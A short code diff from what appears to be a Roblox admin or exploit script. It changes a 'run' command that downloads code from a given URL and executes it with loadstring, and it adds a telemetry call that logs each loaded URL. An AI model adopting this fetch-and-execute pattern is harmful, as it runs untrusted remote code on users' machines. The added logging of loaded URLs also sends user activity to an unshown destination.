-addcmd("run", {"exec", "load"}, function(args, speaker) loadstring(game:HttpGet(args[1]))() end)
+addcmd("run", {"exec", "load"}, function(args, speaker)
+	local targetUrl = args[1]
+	if targetUrl and targetUrl ~= "" then
+		pcall(function() TEL.logScriptLoad(targetUrl) end)
+	end
+	loadstring(game:HttpGet(targetUrl))()
+end)
 
 addcmd("stopsound", {"stopsounds"}, function()
 	for _, s in ipairs(soundsPlaying) do
